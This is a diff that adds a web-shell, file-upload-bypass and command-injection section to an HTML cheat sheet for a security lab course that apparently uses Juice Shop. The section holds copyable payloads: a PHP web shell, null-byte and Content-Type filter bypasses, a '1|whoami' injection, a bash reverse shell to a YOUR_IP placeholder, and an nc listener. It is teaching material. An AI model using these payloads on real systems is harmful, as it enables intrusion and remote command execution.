@@ -610,6 +610,105 @@
       </div>
     </section>
 
+    <!-- Category 3d: File Upload, Web Shells & Command Injection -->
+    <section class="cheat-section" id="web-shells">
+      <div class="cheat-section__header">
+        <span style="font-size:1.25rem;">🐚</span>
+        <h2 class="cheat-section__title">File Upload, Web Shells &amp; Command Injection (Lab 06)</h2>
+      </div>
+      <div class="cheat-table-container">
+        <table class="cheat-table">
+          <thead>
+            <tr>
+              <th style="width:40%;">Payload / Command</th>
+              <th style="width:25%;">Action</th>
+              <th style="width:25%;">How it works</th>
+              <th style="width:10%;">Source</th>
+            </tr>
+          </thead>
+          <tbody>
+            <tr>
+              <td>
+                <div class="code-copy-inline">
+                  <code>&lt;?php system($_GET['cmd']); ?&gt;</code>
+                  <button type="button" class="terminal-copy-btn" onclick="navigator.clipboard.writeText('<?php system($_GET[&quot;cmd&quot;]); ?>')">Copy</button>
+                </div>
+              </td>
+              <td><strong>PHP web shell</strong></td>
+              <td>Upload as <code>.php</code> to a server that runs PHP, then request <code>...php?cmd=id</code>. Runs any OS command as the web user (<code>www-data</code>) and returns the output</td>
+              <td><a href="./labs/lab06.html#webshell-upload" class="badge-lab-ref">Lab 06</a></td>
+            </tr>
+            <tr>
+              <td>
+                <div class="code-copy-inline">
+                  <code>Content-Type: image/jpeg</code>
+                  <button type="button" class="terminal-copy-btn" onclick="navigator.clipboard.writeText('Content-Type: image/jpeg')">Copy</button>
+                </div>
+              </td>
+              <td><strong>Bypass a Content-Type check</strong></td>
+              <td>Keep the <code>.php</code> filename and payload, change only the client-sent <code>Content-Type</code> in Burp. The server trusts a header you control</td>
+              <td><a href="./labs/lab06.html#beat-the-filter" class="badge-lab-ref">Lab 06</a></td>
+            </tr>
+            <tr>
+              <td>
+                <div class="code-copy-inline">
+                  <code>exploit.php%00.jpg</code>
+                  <button type="button" class="terminal-copy-btn" onclick="navigator.clipboard.writeText('exploit.php%00.jpg')">Copy</button>
+                </div>
+              </td>
+              <td><strong>Null-byte extension bypass</strong></td>
+              <td>The upload filter sees <code>.jpg</code> and allows it; the server strips the null byte and saves/runs <code>exploit.php</code>. Also try <code>.phtml</code></td>
+              <td><a href="./labs/lab06.html#beat-the-filter" class="badge-lab-ref">Lab 06</a></td>
+            </tr>
+            <tr>
+              <td>
+                <div class="code-copy-inline">
+                  <code>/ftp/package.json.bak%2500.md</code>
+                  <button type="button" class="terminal-copy-btn" onclick="navigator.clipboard.writeText('/ftp/package.json.bak%2500.md')">Copy</button>
+                </div>
+              </td>
+              <td><strong>Poison null byte (file read)</strong></td>
+              <td>Juice Shop blocks the <code>.bak</code> with a 403, but <code>%2500</code> makes the extension filter see <code>.md</code> while the file system opens the <code>.bak</code></td>
+              <td><a href="./labs/lab06.html#misconfig-recon" class="badge-lab-ref">Lab 06</a></td>
+            </tr>
+            <tr>
+              <td>
+                <div class="code-copy-inline">
+                  <code>1|whoami</code>
+                  <button type="button" class="terminal-copy-btn" onclick="navigator.clipboard.writeText('1|whoami')">Copy</button>
+                </div>
+              </td>
+              <td><strong>OS command injection</strong></td>
+              <td>When input lands in a shell command, <code>|</code> pipes the first command's output into your own. <code>;</code>, <code>&amp;&amp;</code>, and backticks chain too</td>
+              <td><a href="./labs/lab06.html#command-injection" class="badge-lab-ref">Lab 06</a></td>
+            </tr>
+            <tr>
+              <td>
+                <div class="code-copy-inline">
+                  <code>bash -i &gt;&amp; /dev/tcp/YOUR_IP/4444 0&gt;&amp;1</code>
+                  <button type="button" class="terminal-copy-btn" onclick="navigator.clipboard.writeText('bash -i >& /dev/tcp/YOUR_IP/4444 0>&1')">Copy</button>
+                </div>
+              </td>
+              <td><strong>Reverse shell (target calls home)</strong></td>
+              <td>Inject this so the target connects back to your listener, giving an interactive prompt. Pair with <code>nc -lvnp 4444</code> on your box</td>
+              <td><a href="./labs/lab06.html#command-injection" class="badge-lab-ref">Lab 06</a></td>
+            </tr>
+            <tr>
+              <td>
+                <div class="code-copy-inline">
+                  <code>nc -lvnp 4444</code>
+                  <button type="button" class="terminal-copy-btn" onclick="navigator.clipboard.writeText('nc -lvnp 4444')">Copy</button>
+                </div>
+              </td>
+              <td><strong>Catch the reverse shell</strong></td>
+              <td><span class="flag-pill">-l</span> listen, <span class="flag-pill">-v</span> verbose, <span class="flag-pill">-n</span> no DNS, <span class="flag-pill">-p</span> port. Waits for the target to connect back</td>
+              <td><a href="./labs/lab06.html#command-injection" class="badge-lab-ref">Lab 06</a></td>
+            </tr>
+          </tbody>
+        </table>
+      </div>
+    </section>
+
     <!-- Category 4: Transport Layer & Handshake State Probing -->
     <section class="cheat-section" id="tcp-handshake">
       <div class="cheat-section__header">
